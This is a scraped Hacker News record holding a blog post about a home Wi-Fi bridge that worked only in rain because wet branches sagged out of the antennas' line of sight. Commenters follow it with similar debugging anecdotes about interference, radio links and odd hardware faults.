[
  {
    "id": 39896371,
    "title": "Rain reveals Wi-Fi interference solution",
    "originLink": "https://predr.ag/blog/wifi-only-works-when-its-raining/",
    "originBody": "The Wi-Fi only works when it's raining April 01, 2024 april cools debugging hardware personal Happy April 1st! This post is part of April Cools Club: an April 1st effort to publish genuine essays on unexpected topics. Please enjoy this true story, and rest assured that the tech content will be back soon! That's what my dad said when I asked what was wrong with our home internet connection. \"The Wi-Fi only works when it's raining.\" Let's back up a few steps, so we're all on the same page about the utter ridiculousness of this situation. At the time, I was still a college student — this was over 10 years ago. I had come back home to spend a couple of weeks with my parents before the fall semester kicked off. I hadn't been back home in almost a full year, because home and school were on different continents. My dad is an engineer who had already been tinkering with networking gear longer than I'd been alive. Through the company he started, he had designed and deployed all sorts of complex network systems at institutions across the country — everything from gigabit Ethernet for an office building, to inter-city connections over line-of-sight microwave links. He is the last person on Earth who would say a \"magical thinking\" phrase like that. \"What?\" I uttered, stunned. \"The Wi-Fi only works while it's raining,\" he repeated patiently. \"It started a couple of weeks ago, and I haven't had a chance to look into it yet.\" \"No way,\" I said. If anything, rain makes wireless signal quality worse, not better. Never better! Two weeks without reliable internet? I started a speed-run through the stages of grief... Denial I pulled open my laptop and started poking at the network. Pinging any website had a 98% packet loss rate. The internet connection was still up, but only in the most annoying \"technically accurate\" sense. Nothing loads when you have a 98% packet loss rate! The network may as well have been dead. I was upset. I had just started dating someone a few months prior, and she was currently on the other side of the planet! How was I to explain that I couldn't stay in touch because it wasn't raining? Mobile data at the time was exorbitantly expensive, so much so that I didn't have a data plan at all for my cell service at home. I couldn't just use my phone's data plan to work around the problem, like one might do today in a similar situation. I was pacing around the house, fuming. Grief, stage two! That's when the rain started. Bargaining Like a miracle, within 5 minutes of the rain starting, the packet loss rate was down to 0%! I couldn't believe my eyes! I was ready for the connection to die at any second, so I opened a million tabs at once — as if I don't normally do that anyway... The rain held up for about an hour, and so did the internet connection. Then, 15 minutes or so after the rain stopped, the packet loss rate shot back up to 90%+. The internet connection went back to being unusable. I was ready to do just about anything to get more rain. Thankfully, the weather stayed grey and murky for the next few days. Each time, the pattern stayed the same: The rain starts, and not even a few minutes later the internet connection is crisp and fast. The rain stops, and within 15 minutes the internet connection is unusable again. As much as I hated to admit it, the evidence was solid. The Wi-Fi only works when it's raining! At this point, I had a choice to make. I could keep going through the stages of grief: I could sulk and plan my calls with my girlfriend around the weather forecast. Or, I could break out of that downward spiral and get to the bottom of what was going on. \"Magical thinking be damned! Am I an engineer or what?\" I told myself. That settled it. I wasn't going to take this lying down. Determination Some context on our home networking setup is in order. Remember how my dad's company had extensive experience with networking solutions? Well, we had a fancy networking setup at home too — and it had worked flawlessly for the best part of 10 years! My dad's office had a very expensive, very fast For the time, of course. commercial internet connection. The home internet options, meanwhile, weren't great! In my family, we are often stubbornly against settling for less unless there's absolutely no other choice. The office and our apartment were a few blocks away from each other along a small hill, with our second-floor apartment holding the higher ground. With a bit of work, my dad set up a line-of-sight Wi-Fi bridge — a couple of high-gain directional Wi-Fi antennas pointed at each other — between the office and our apartment. This let us enjoy the faster commercial internet connection at home! I started poking around the network to figure out where the connection was breaking down. The local Wi-Fi router at home was working well — no packets lost. The local end of the Wi-Fi bridge was fine too. But pinging the remote end of the Wi-Fi bridge was showing a 90%+ packet loss rate — and so did pinging any other network device behind it. Aha, there's something wrong with the Wi-Fi bridge! But what? And why now, when the system had been working fine for almost 10 years, rain or shine? Maybe years of work experience isn't a good metric here either 😄 How can a rain storm fix a Wi-Fi bridge, anyway? So many confusing questions. Time to get some answers! Debugging Like any experienced engineer, the first thing I tried was turning everything off and then on again. It didn't work. Then I checked all the devices on the network individually: Maybe one of the devices has gone bad with age? Nope. I physically connected my laptop to each device's local Ethernet, then ran diagnostics, pinged the devices over the wired connection, etc. Maybe a cable got unseated or came loose? Nope. Maybe a power brick has become faulty over time? Nope. Maybe an automatic firmware update failed and broke something? Nope. Maybe an antenna connector has corroded from spending years outdoors? Nope. Unlike debugging software, a lot of this hardware debugging was annoyingly physical. I had to climb up ladders, trace cables that hadn't been touched in 10 years, and do a lot of walking back and forth between our home and my dad's office. On my umpteenth back-and-forth walk, as I was bored and exasperated, I started noticing how much our neighborhood had changed in the many years I hadn't been living at home full-time. Before college, I spent four years at a boarding high school. I was on our national math and programming teams for the IMO and IOI), so I even spent most of each summer away from home at prep camps and at the competitions themselves. Many of the little neighborhood shops were new. Many houses had gotten a fresh coat of paint. Trees that used to be barely more than saplings had grown tall and strong. Then it hit me. Realization I ran home and climbed up onto the scaffolding holding up the Wi-Fi bridge's antenna. I was hanging precariously off the side of our apartment building, two stories up in the air. In retrospect, a safety harness would have been a good idea... Things people do for internet! Don't forget, a girl was involved too — I wasn't doing this merely for Netflix or Twitter. Then I looked downhill, at the antenna that formed the second half of the Wi-Fi bridge. Or at least, toward the antenna, because I couldn't see it — a tree in a neighbor's yard was in the way! Its topmost branches were swaying back and forth in the line-of-sight between the antenna pair. Bingo! The Problem and the Fix Here's what was going on. Many years ago, we installed the Wi-Fi bridge. For a long time, everything was great! But every year, our neighbor's tree grew taller and taller. Shortly before when I came back home that summer, its topmost branches had managed to reach high enough to interfere with our Wi-Fi signal. It was only barely tall enough to interfere with the signal, though! Every time it rained, the rain collected on its leaves and branches and weighed them down. The extra weight bent them out of the way of the Wi-Fi line-of-sight! Interestingly, objects outside the straight line between antennas can still cause interference! For best signal quality, the Fresnel zone between the antennas should be clear of obstructions. But perfection isn't achievable in practice, so RF equipment like Wi-Fi uses techniques like error-correcting codes so that it can still work without a perfectly clear Fresnel zone. Each time the rain stopped, the rainwater would continue to drip off the tree. Slowly, over the course of 15ish minutes, that would unburden the tree — letting it rise back up into the path of our bits and bytes. That's when the Wi-Fi would stop working. The fix was easy: upgrade our hardware. We replaced our old 802.11g devices with new 802.11n ones, which took advantage of new magic math and physics to make signals more resistant to interference. One such piece of magic new to 802.11n Wi-Fi is called \"beamfoming\" — it's when a transmitter can use multiple antennas transmitting on the same frequency to shape and steer the signal in a way that improves the effective range and signal quality. Modern Wi-Fi does beamforming with only a few antenna elements, but if we scale that number way up we get a phased array antenna. Ever wondered how come Starlink antennas are flat and not a \"dish\" like old satellite TV antennas? They use phased arrays to aim their signal at the Starlink satellites streaking across the sky — without any moving parts. Magic! Physics! A few days later, the new gear arrived and I eagerly climbed back up the scaffolding to install the new antennas. A few screws, zip ties, and cable connections later, the Wi-Fi's \"link established\" lights flashed green once again. This time, it wasn't raining. All was well once again. Hope you enjoyed this true story! April Cools is about surprising our readers with fun posts on topics outside our usual beat. Check out the other April Cools posts on our website, and consider making your own blog part of April Cools Club next year! Thanks to Hillel Wayne and Jeremy Kun for reading drafts of this post. All mistakes are my own.",
    "commentLink": "https://news.ycombinator.com/item?id=39896371",
    "commentBody": "The Wi-Fi only works when it's raining (predr.ag)888 points by bonyt 16 hours agohidepastfavorite267 comments jordigh 16 hours agoLet me see if I'm the first one to link to that classic story in the same series, \"I cannot send email further than 500 miles\" http://www.ibiblio.org/harris/500milemail.html Or the Magic/More Magic switch http://www.catb.org/jargon/html/magic-story.html It's fun when physical reality meets the abstract models that we have built in our heads of these machines. reply freedomben 12 hours agoparentOh man, this is one of my favorite lines of all time: > \"Anyway, I asked one of the geostatisticians to look into it--\" > \"Geostatisticians...\" > \"--yes, and she's produced a map showing the radius within which we can send email to be slightly more than 500 miles. There are a number of destinations within that radius that we can't reach, either, or reach sporadically, but we can never email farther than this radius.\" I adore when experts use their expertise to analyze real-world things like this and provide ridiculously thorough explanations :-D reply neilv 11 hours agorootparentMy favorite story kinda of this nature, of an expert as alien intelligence, was Feynmann's calculations about computer architecture of the Connection Machine: https://longnow.org/essays/richard-feynman-connection-machin... It's a few paragraphs, maybe too much to quote, but the bulk of it starts with: > By the end of that summer of 1983, Richard had completed his analysis of the behavior of the router, and much to our surprise and amusement, he presented his answer in the form of a set of partial differential equations. To a physicist this may seem natural, but to a computer designer, treating a set of boolean circuits as a continuous, differentiable system is a bit strange. [...] Our discrete analysis said we needed seven buffers per chip; Feynman's equations suggested that we only needed five. We decided to play it safe and ignore Feynman. Guess who was right. The whole essay is worth reading, if you haven't yet. reply greesil 4 hours agorootparentThat was a great read. It was also interesting to read about what happened to the company. https://en.m.wikipedia.org/wiki/Thinking_Machines_Corporatio... One thought I had while reading this was what areas of technologies are still open to amateurs. reply eszed 5 hours agorootparentprevI hadn't seen that before, so thanks for posting it. What a great story! reply fsckboy 11 hours agorootparentprevit's a useful analysis. Nobody thought of router hops, but this pattern is pretty much what you'd expect, so it was a very good hint. reply sebtron 14 hours agoparentprevOr the \"Car allergic to vanilla ice cream\" story [1]. [1] https://news.ycombinator.com/item?id=37584399 reply vikingerik 12 hours agoparentprevMy recent version: I was playing a pinball game in an arcade. One particular ramp shot was registering earlier in the day and then stopped working. Eventually I realized that the sensor is an optical beam, and the receiver happened to be in direct sunlight coming in through a window! So it was continuously receiving infrared and would never report the beam being blocked by a pinball. Sure enough, it started working again once the sun angle changed by a few more degrees. reply tiltowait 15 hours agoparentprevI forgot all about the 500 miles story. My favorite line: > If the problem had had to do with the geography of the human recipient and not his mail server, I think I would have broken down in tears. reply tombert 15 hours agoparentprevThe 500 mile email story is one of my favorite reminders that, fundamentally, we're still governed by the laws of physics. It's funny, but it's also a reminder that, while networks might be very fast, the latency is still going to be governed by the speed of light. reply ortusdux 14 hours agorootparentIf we are doing classic stories - Grace Hooper and the Nanosecond of wire https://www.youtube.com/watch?v=9eyFDBPk4Yw https://americanhistory.si.edu/collections/nmah_692464 reply hughesjj 3 hours agorootparentprevI actually like thinking about the exchange of physical information as a network propagation delay, and entanglement/coherence as a distributed consensus algorithm. They're kinda samey from a conceptual point of view (in my amateur opinion) reply ck2 15 hours agorootparentprevWell laws of physics is what gave us radio in the first place. Some of my favorite video documentaries are on how it was theorized and then slowly developed over years and decades until they finally got to spark-gap transmitters. https://en.wikipedia.org/wiki/Timeline_of_radio But just imagine listening to spark-gap morse code radio broadcasts for years as amateur and then suddenly someone does a broadcast test of actual voice (violin!) That must have been incredible to hear wirelessly. 24 December 1906 Reginald Fessenden, that was the leap that eventually gave us wifi https://en.wikipedia.org/wiki/Reginald_Fessenden reply duxup 14 hours agoparentprevI had a customer who used a line of sight system for extending their network across part of a city. I had a shortcut on my desktop with the weather for that town ready when they would inevitably call and blame our unrelated equipment for some problem. reply scbrg 13 hours agorootparentI worked at a small, local ISP in the 90:ies that had a point to point link across the river, handling the dial up traffic from the telecom company we partnered with. Every few days, always at roughly the same time, all incoming dial up traffic would drop. A minute later, the customers could reconnect. It took a while before we realized that one of the huge passenger ferries that docked a short distance upstream was the cause. When it arrived and departed, its chimneys and possibly bridge and highest deck blocked LOS across the river. reply dmurray 13 hours agorootparentprevI used to work in high-frequency trading. I had several tabs permanently open to the live weather radar feed for regions where we had microwave towers: the NE USA, the South of England, the Alps... reply none_to_remain 8 hours agorootparentI used to be in an adjacent field and we used to joke about when the HFT guys were gonna get working on some neutrino detectors & sources to signal straight through the Earth. You could use them for science on the weekends! reply gleenn 7 hours agorootparentSounds awesome, to be able to send a signal directly through the whole earth from point to point. It also sounds like origin story of X-Men or a new cancer reply seabass-labrax 11 hours agorootparentprevI'm curious to know where your towers were. Do you know if they still exist? Were your microwave antennae co-located on other operators' towers (e.g. those for VHF radio), or did your company have towers all to itself? reply dmurray 11 hours agorootparentWithout going into anything confidential - we had some of our own hardware, but generally rented capacity from firms like [0]. Some towers were custom built for HFT, some were shared with other types of users. A famous blog post investigating some of the towers as an outsider, at [1], will be of interest to you. If you want to guess where they are, get a globe, find the datacentres where electronic exchanges operate (it's not a secret: Chicago, New Jersey, London, Tokyo, Frankfurt, Zurich...) and draw the straightest possible lines between pairs of them. Microwaves don't cross the ocean. [0] https://www.mckay-brothers.com/ [1] https://sniperinmahwah.wordpress.com/2014/09/25/hft-in-my-ba... reply LtdJorge 2 hours agorootparentIs the microwave setup quicker than going through fiber nowadays? I only mean in terms of latency. reply dmurray 1 hour agorootparentTraditional optical fiber has glass in the middle. The speed of light in glass is only about 66% of the speed in air, so microwave is always faster if you can get a reasonably straight path for both. There now exists hollow-core fiber, where the light travels down an air gap in the middle, which is theoretically competitive with microwaves/lasers/etc. How much this is being used is a secret, but microwave transmission definitely hasn't gone away. reply miki123211 10 hours agoparentprevThere was a site with stories like these somewhere, I sadly can't remember the URL any more. I think the one that stuck out to me was the Soviet mainframe computer that would get weird bit flips almost every day, always at the exact same time. Somebody compared what was different about the days it didn't get bit flips on, it turns out those were the days on which a particular train didn't run, the computer was very close to a railway station. What train was it, you ask? The one transporting the (definitely perfectly safe to eat, definitely not filled to the brim with nuclear radiation) cow meat from Chernobyl. The radiation was intense enough to cause bit flips, I'm sure the quality of soviet components didn't help here either. reply nomel 7 hours agorootparentPerhaps thedailywtf.com? reply danlugo92 5 hours agorootparentWhat was the one for Apple stories...? reply timoteostewart 4 hours agorootparenthttps://www.folklore.org/0-index.html reply redbell 2 hours agoparentprevThis is a true classic that never gets old! Discussed many times here in HN: 1. https://news.ycombinator.com/item?id=37576633 2. https://news.ycombinator.com/item?id=23775404 3. https://news.ycombinator.com/item?id=9338708 reply sspiff 12 hours agoparentprevAs someone with very limited electrical experience, the more magic switch story instantly went \"the second terminal of the switch is probably grounded to the switch casing\" when they explained it only had one connected terminal. This is a very common thing in older automotive electronics, for example. reply 2-3-7-43-1807 4 hours agoparentprevi love those stories plus their detailed explanations because you can learn so much from them about technology, physics and even psychology. reply asadhaider 15 hours agoparentprevFirst thing I thought of too. Anyone know if there a list of more articles similar to these three? reply Tomte 15 hours agorootparentMy wife has complained that open office will never print on Tuesdays!? https://bugs.launchpad.net/ubuntu/+source/cupsys/+bug/255161... reply mikegreenberg 14 hours agorootparentprevI have one first-hand story: I did tech support via phone for a popular consumer computer brand. One particular call, a woman reported that her computer was restarting every time someone in the house flushed the toilet. Long story short, her home was in the back-back woods with the home powered by a generator. In addition to powering the computer, the generator was also the source of power for a water pump which would kick on to refill the toilet bowl whenever it emptied. And wouldn't you know that that water pump had a beefy coil around its motor and would brownout the entire house every time it started? reply taneq 9 minutes agorootparentI have a similar one, with an automated monorail hoist. The engineer who started the job had ordered the monorail hoist with a control cabinet with Ethernet comms to tell it where to move (instead of just controlling the hoist directly from the main control cabinet.) After days' worth of shenanigans trying to troubleshoot seemingly random comms drop-outs I'd narrowed it down to only occurring when the hoist was being lowered under load, which led me to the Ethernet cable in the hoist cabinet which ran parallel to the motor cables from the hoist's 6kW VSD. Whenever it lowered, the EMI was enough to nuke the Ethernet connection. Re-routed the Ethernet cable and after that it ran fine. reply cyberax 14 hours agorootparentprevMy personal example: VoIP phones stopping after the Asterisk server was up for 3 days. Reason: the server had IPv6 turned on, and it steadily accumulated privacy IPv6 addresses. These addresses were all sent in a packet describing the supported media endpoints, using UDP. And yep, eventually it overflowed the MTU and the phones couldn't handle the fragment reassembly. reply gerdesj 13 hours agorootparentWhich distro was that? ... asking for a friend ... reply cyberax 12 hours agorootparentJust regular Ubuntu. It was around 2009 or so. reply gerdesj 10 hours agorootparentThanks. I've never run Asterisk on Ubuntu. FreePBX is CentOS based which is mostly what I've run Asterisk on. I only started to worry about Ubuntu around 2012. That mad IPv6 address thing must have stuffed up more than just a VoIP negotiation packet. DNS switches from UDP to TCP when responses get too large. reply cyberax 9 hours agorootparentDNS is affected, but differently. It's mostly DNSSEC signatures that cause trouble nowadays. SIP is special because the signalling and media protocols are separate. So when a call is being established, the parties exchange their media endpoint locations. This necessarily means that the server has to list its IPs (or DNS names) so that the client can choose the best one. And as a quirk of SIP, it sends the entire set for each of its supported codecs. reply gerdesj 1 hour agorootparent\"SIP is special\". Yes, I know, just like ftp 8) I do hope that whomever invented putting the control channel in a separate stream from the data is mildly discomforted. Mind you, all that stuff was invented a very long time ago, when trousers were a major trip hazard. My go to fix is \"symmetric RTP\", which seems to have become a default over the last decade or two. reply WorldMaker 13 hours agorootparentprevHere's one attempt I've seen in other HN comments at a shared \"awesome list\" of these sorts of stories: https://github.com/danluu/debugging-stories reply fabatka 14 hours agorootparentprevI remember one (might have been a hn-er's comment, dunno) about the computer restarting when the toilet was flushed. Turns out it was due to voltage drop when a compressor turned on to refill the reservoir of the toilet. reply stavros 8 hours agorootparentIt was: https://news.ycombinator.com/item?id=39898272 reply zerd 11 hours agorootparentprevThe podcast that kills the car stereo episode of Reply All is pretty funny https://gimletmedia.com/amp/shows/reply-all/brh8jm reply wrboyce 11 hours agorootparentprevhttps://500mile.email although I do wish it had more content! reply RandallBrown 13 hours agorootparentprevThe Daily WTF is full of them. https://thedailywtf.com reply DonHopkins 13 hours agorootparentprevA user was having a really bizarre problem: They could log in when they were sitting down in a seat in front of the keyboard, but when they were standing in front of the keyboard, their password didn't work! The problem happened every time, so they called for support, who finally figured it out after watching them demonstrate the problem many times: It turned out that some joker had rearranged the numbers keys on the keyboard, so they were ordered \"0123456789\" instead of \"1234567890\". And the user's password had a digit in it. When the user was sitting down comfortably in front of the keyboard, they looked at the screen while they touch-typed their password, and were able to log in. But when they were standing in front of the computer, they looked at the keyboard and pressed the numbers they saw, which were wrong! reply barryrandall 15 hours agorootparentprevDNS responses sent over UDP are often truncated if the response is too large. This manifests itself as \"machine unreachable if name > x characters\" sort of errors when you have really long FQDNs. reply ksherlock 9 hours agorootparentprevThere's the car/ice-cream/vapor-lock story. Oops, I ruined it. https://www.snopes.com/fact-check/cone-of-silence/ reply nosmokewhereiam 12 hours agoparentprevMagic/more magic legend lives! I tell that to everyone experiencing a spooky troubleshooting! reply lamontcg 15 hours agoparentprevand previously discussed: https://news.ycombinator.com/item?id=9338708 reply amelius 15 hours agoparentprevI came here to see if someone posted that. reply FergusArgyll 13 hours agoparentprevBoy did that [0] send me down a long rabbit hole [0] magic-story reply nunesvn 7 hours agoprevI don't know if this is fake, but it could be true. I had a similar situation working for a WISP around 2010. Every night, for about 10 minutes, the connections from our HQ to a relay tower became flaky. At the time we were using two Mikrotik 5GHz cards and some large antennas. You could sit in front your computer and wait, a few minutes after the sunset, for the monitoring alerts start arriving. After a week trying everything, including changing hardware (to the same specs), I was very disappointed with the thing and got out to smoke around the sunset. Then some huge lamps we had around the building switched on, based on a light sensor. Immediately I received the SMS alerts on my phone. I ran into the building, turned off the external lights and bingo: 0% packet loss. It turns out that the building management had changed all of external lamps the week before, with new sodium-vapor bulbs. And for some reason, on the first 5 to 10 minutes with these lights on, it caused very high interference on the 5GHz band. Changed the lamps, problem solved. reply justsomehnguy 6 hours agoparent> And for some reason The ballast and the bulb itself are quite noisy in RF and then they are heating up they even more noisier. reply drb999 14 hours agoprevReminds me of an extremely similar case with a long distance microwave link at a mobile telecom provider in Australia that I worked for. They relied quite heavily on microwave link chains and this particular one was in northern Queensland where fixed lines were hard to find and no local engineers were locally present/aware of the changing environment. Every week day + Saturday, from 7-3 the link would keep cutting out intermittently. Then work fine and the rest of the day and on Sunday… a crane, building a new residential building would operate during those hours right in the middle of the microwave path. Many weeks of theories and time wasted until someone had a chance to visit. :) reply Sharlin 14 hours agoparentAmazing. Reminds me of the fact that militaries really don't want wind turbines in areas where good radar coverage is important (case in point: the Finnish Defense Forces anywhere near the Russian border); even though the blades aren't metal, they're still a source of noise and radar shadow. reply swores 12 hours agorootparentI'm not at all knowledgable about this, but: is it feasible (and if so, hard?) or impossible to have some sort of live reporting from the turbines about the speed/position of their blades that connects to the radar system allowing it to ignore what it knows to be turbine noise/shadow and therefore be able to have turbines there and still get good radar? reply Sharlin 11 hours agorootparentWell, you can't just ignore a radar shadow or noise. Just like GP's point-to-point microwave link couldn't just \"ignore\" the crane. You can't make a bad Wi-fi connection faster by just telling your computer to ignore the wall between you and the hot spot. A wind turbine is a solid obstacle that conceals stuff behind it, and even if a single turbine might not be a big deal, most commonly someone interested in harnessing wind power would want to build an entire farm, which would be much worse. reply swores 2 hours agorootparentMy (probably ignorant) thinking was that if there weren't propellers, just stalks, they could be arranged in a pattern that radar setups at multiple locations could see through gaps and between them have no dark spaces caused by the towers. Leaving the problem that the blades essentially block out an entire circle, but if the radar software knows the position of every turbine's blades (by a combination of turbines reporting location/speed/acceleration of blades in real time and maybe modelling so the radar system can know in time at least fairly if not very accurately where all blades are in a field of them) then when a radar bounces of one it can say \"that doesn't count as a hit\" leaving only non-turbine objects showing up in the UI that the radar setup outputs? Is it that radar can't ping / receive at a high enough frequency to distinguish the difference between \"this fraction of a ms the blade was at that location so we don't care about the radar hitting something, but the next fraction of a ms the blade had moved and we still got a ping from just behind it so there's something there\"? Or some other problem with the idea? reply juitpykyk 2 hours agorootparentDepends on the width of the radar beam. They are certainly not thin like a laser. It might not fit in the gap between the blades. reply smcl 12 hours agorootparentprevEven if you ignored the turbines themselves, there would still be a \"shadow\" behind the turbines though I think? Which means you'd have a blind spot every now and then (when the wind is blowing and the turbines are active) which could be exploited by an enemy reply obi1kenobi 12 hours agorootparentEven if you are looking at the turbines \"edge-on,\" there's probably going to be a noticeable Doppler return as well. Plastic drones with plastic propellers are still visible on radar because the tiny propellers spin super fast, so they light up like a Christmas tree on Doppler radar because the approaching vs receding velocities of the blades are so different. reply swores 2 hours agorootparentAny chance you can explain to this idiot (me) the flaw in my thinking? https://news.ycombinator.com/item?id=39903084 reply ozim 3 hours agoparentprevLove that story. For me it reminds me most debugging I see at work. People coming up with theories and doing some magic incantations on the interface. Instead of reading the log files or reading error description which makes usually error and fix obvious in 10 seconds. reply rawbot 2 hours agorootparentReading log files with really obscure error messages might as well be reading a magical grimoire. Especially when the solution turned out to have nothing to do with the error message. reply ozim 1 hour agorootparentHey but that is not a discussion, that's just throwing anecdote to bring other person down or make yourself feel better. reply mschuster91 13 hours agoparentprevAt that point, I'd have called a bush pilot to fly along the lines! reply neilv 16 hours agoprevThe title might've been a Fleetwood (the other kind of) Mac reference. o/~ Wi-Fi's only working when it's rainin' Players only stutter when they're buff'rin' Websites, they will page load oh so slooooww When the rain falls down, you can download reply hbn 13 hours agoprevThe unusual internet setup is pretty important information to bury a few paragraphs in. Once that was explained it seemed like they should have started by checking nothing was blocking the antenna before tediously running around plugging the laptop into things and following cables and checking power supplies on the networking equipment? Hindsight is 20/20 but I correctly guessed the ending as soon as that information was added. reply koyote 9 hours agoparentI thought the same, although I probably would not have immediately gone to the Wifi transmitter. After a couple decades of debugging various internet issues the first thing I now do is check the 'source' works (i.e. plug a laptop into the modem directly, but with a different cable). If that works I go down 'the line' until something does not work. That usually finds the culprit quite quickly (and also stops me from messing with my router config when it's an ISP issue). In OPs scenario, the moment you realise that the office internet is working fine and it's only the home internet that is having issues, the connection between the two would have been the obvious place to look next. That being said, it's still a fun story, and still quite 'unexpected' that rain could be the determinating factor on whether you'll have working internet or not. reply JamisonM 6 hours agoparentprevAs soon as he described the physical setup I was screaming \"Tree!\" internally. reply yakkomajuri 13 hours agoparentprevnext [13 more] [flagged] jeppebemad 13 hours agorootparentI think it’s a fair comment. A lot of readers on HN are adept debuggers, and will start to analyze everything from the first paragraph. By burying the lede like that, it feels like wasted time, to have begun debugging before the (incredibly important) part about the unusual setup was revealed. Seems almost implausible that the protagonist, with his technical knowhow, did not think of this earlier.. Anyway, it’s a matter of storytelling, and that matters! reply yakkomajuri 13 hours agorootparentI may have just picked this comment to express overall frustration so for that I apologize. But I don't know - writing is something that comes in a flow. This wasn't some deliberate clickbaity thing by the author, they just wrote it in a way that that made sense to them. It also seems that the author themselves did not consider the setup at first, which happens, as sometimes we have tunnel vision. You may criticize his abilities I guess, although overall it just felt like an account of things as they happened to the author, not considering how someone might be trying to guess things once they publish it. So yeah, I don't know, I just feel like there's too much negativity sometimes. But maybe I overreacted. reply fragmede 11 hours agorootparentfwiw I don't think you overreacted. It's not like anyone's making hbn read this story. it's like complaining about the movie Titanic, that because we know the boat sinks, its not worth watching. the alternate version of this post goes \"I fixed my dad's Internet. The neighborhood's tree grew too tall and blocked the signal so I upgraded the 10 year old hardware. The end.\" How much less fun and interesting is that? reply hbn 13 hours agorootparentprevI'm not bragging, I'm just saying if you have one custom, specialized part in your setup that's particularly out of the ordinary and prone to failure, I'm surprised you wouldn't start there. If you're e.g. running a piece of software with a crazy custom plugin that overhauls major functionality and then an update to the base software breaks everything, it shouldn't be TOO much of a mystery on where to start looking. When you add weird custom parts to a system, it tends to be a point of failure. Perhaps the author just didn't remember that they had a custom setup like that, but it wasn't framed in the article like \"suddenly I remembered...\", it was just stated as a given. And the fact that it was giving them particularly high speed home internet access for the time, it'd be a kind hard thing to forget? reply obi1kenobi 12 hours agorootparent(Author here) I didn't forget, it just didn't seem like the most likely problem. Like I said in a reply to a sibling to your comment, the gear was ~10yrs old at the time and had been working fine until then. It was perched in a very inconvenient spot because it had to \"look around the corner\" of the building, so checking the line of sight wasn't just a case of looking out the window. I went in order of \"most likely to be the problem, weighted by how easy they were to check.\" This is a debugging strategy that has served me well, and I don't regret using it that time either. reply OJFord 11 hours agorootparentBut rain is more obviously related^ to a point to point link than aging hardware or some kind of bad update? (^though of course the improvement is surprising! I assumed there was antennae involved, whether point to point or LTE or whatever, just from the title. The story to me was from the outset why's it better not worse in rain.) reply obi1kenobi 8 hours agorootparentRelated, sure! But it could be rain helping close a circuit on a rusty antenna connector port. Or rain improving the grounding of some neighboring circuit that otherwise drains through the metal scaffolding the antenna is attached to. Or rain attenuating a neighbor's own Wi-Fi that otherwise might have been aggressively transmitting on the same channel as our units. The rain and the Wi-Fi devices were clearly related. How they were related, was not clear. Aging hardware rusts, breaks, gets yanked around or unseated or pulled out of the ground, or has water enter in places where it shouldn't be. I was already running diagnostics on everything to figure out which devices might be faulty (local AP, local bridge unit, local antenna, remote antenna, remote bridge unit, remote switch, remote modem/router, upstream connection to ISP) so checking for \"update gone wrong\" was a 3 second job: I was already in the admin UI, so check logs, nope, no recent updates, done. I'd rather spend 3 seconds checking something that probably isn't the problem but I can know for sure in 3 seconds than risk climbing precariously up a scaffold 30ft in the air only to realize it was just something I could have solved at a keyboard instead. Risk/reward. Low risk, low reward is okay too if it's super fast and already on the way. reply Dylan16807 11 hours agorootparentprevI don't object to your order of debugging, but it was confusing to get that far in before realizing what \"wifi\" really meant in this situation. reply dhosek 12 hours agorootparentprevYes, it’s not a competition, but if you have a line of sight network connection and the network only works when it’s raining, the obvious thing to check is that line of sight. reply obi1kenobi 12 hours agorootparent(Author here) I didn't think to check the line of sight because I was primed by the fact the bridge had been running fine for 10 years. With networking gear that old, it seemed more likely that a device/cable/power brick had just gone bad with age. Also, the antenna is on some metal scaffolding propped out 6ft past the edge of our balcony, because it needs to \"look around the corner\" of the building. It's 30ft in the air, and checking the line of sight involved climbing up there. It certainly wasn't the easiest nor the likeliest thing to check, so I didn't check it first. Multiple people in the comments just here on HN have mentioned having weird situations caused by routers that had gone bad. I imagine most of their routers weren't 10 years old when they started acting up. How old is your router? reply dhosek 8 hours agorootparentFair enough. My current router is less than a year old (my ex-wife got the house and the networking equipment in it). reply keybored 13 hours agorootparentprevThere’s troubleshooting and then there’s the troubleshooting of the troubleshooting post-mortem. GP is just doing the latter. reply ColinWright 14 hours agoprevAnother classic: Can log in while sitting down, can't log in when standing up. I need to find the reference ... Edit: OK, here's one version: https://www.reddit.com/r/talesfromtechsupport/comments/3v52p... reply pugworthy 10 hours agoparentI recall reading a variant of that where a terminal had a \"print screen\" button, and the claim was it would work when standing but not when sitting down (or was it vice versa). In the end there were two print screen buttons, only one of them functional, and one of them more obvious when standing (or sitting). These kind of stories are classic debugging parables that teach you to step back and consider what you may be assuming incorrectly when something absolutely doesn't make sense or seems impossible. reply re 12 hours agoparentprevBased on the title, I expected this to somehow be related to \"Office chair turns off monitors\" (it wasn't, but that is also a good one). https://news.ycombinator.com/item?id=21978004 [Edit: I see this one has also been mentioned a few times already in the thread] reply bpye 2 hours agorootparentI had experienced this one and felt like I was going mad, and then I guess the humidity changed and I gave up/stopped thinking about it. It wasn't until a couple years later I saw a post here about the gas cylinders causing monitors to blank. reply Biganon 11 hours agoparentprevThere's a Mister Bean episode in which his TV will only work when he's sitting next to it (where he obviously cannot see it). I think he manages to watch TV by creating a copy of himself with his clothes next to the TV, while he's sitting naked in front of it reply gerdesj 11 hours agoprevSome years ago I put in a point to point wifi link for a family member, from house to garage \"block\". I specified a pair of Ubiquity Nanostations which are tiny, PoE powered and have a decent range. The house end is inside a UK standard tiled roof - dense 3/4\", allow for slat, so 1\"+ thick and dense material. The other end is 20m away (LoS) and external mounting was forbidden. The garage block has foil lined Kingspan style insulation. I managed to mount that end near enough to a skylight window to work OK. I then daisy-chained an access point off it. All was fine until the sky light was replaced with a metalicised one. The signal just about worked until it rained which was enough to nobble it. When it got annoying enough, me and said family member plotted and I rocked up when someone was absent for the weekend. I moved the garage station to the outside. It now looks like a bird box. I put up a real bird box at the other end too. The fake box would get baked in the sun but the real one is always shaded. reply phyzome 11 hours agoparentWhy was subterfuge required? Something is missing from this story. reply robocat 1 hour agorootparentIf you are renting then you might not be allowed to install an aerial on the building. There are situations where you need council permission to install an aerial or it may be forbidden e.g. listed historic buildings. Also see: https://www.townplanning.info/permitted-development/househol... Just what I found doing a quick search. reply gerdesj 10 hours agorootparentprevLook up WAF! ... (Wife Acceptance Factor - far more important than Web App Firewall) reply hughdbrown 11 hours agoprevI got this far: \"The office and our apartment were a few blocks away from each other...\" and figured it had to be a line of sight transmission. I encountered this in summer of 1993 when the company I worked at installed infrared (I think) transmission across our two offices, separated by 250m. When the summer sun swept behind the transmitter in the northwest-ish, the wifi went out for about an hour each evening. reply 9935c101ab17a66 49 minutes agoprevThe author’s completely over the top reaction to the plausible and not especially weird titular statement gets old, quick. Especially when they reveal that the network is using wifi antennas over a non-insignificant distance in an urban setting. Of course it’s the local wireless point to point bridge! The first thing you’d do is look down the line 